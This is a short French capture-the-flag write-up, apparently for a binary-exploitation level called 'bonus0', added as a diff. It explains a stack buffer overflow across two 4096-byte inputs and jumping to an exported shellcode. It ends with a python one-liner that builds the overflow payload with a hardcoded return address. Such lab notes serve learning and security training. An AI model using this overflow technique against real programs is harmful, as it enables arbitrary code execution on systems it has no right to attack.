@@ -1,0 +1,6 @@
+on voit que le programme prends deux inputs d' un buffer de 4096
+on remplie donc le premier buffer avec 4095 octets + un '\n' pour simuler la touche 'return'
+on voit qu'il essaie de jump sur le 10 charateres du deuxieme input et il faut rajouter en plus pour qu'il segfault
+du coup on export un petit shellcode et on l'appelle
+
+python -c "print 'A' * 4095 + '\n' + 'ABCDEFGHI' + '\xc2\xff\xff\xbf' + 'A' * 50" > /tmp/bonus0
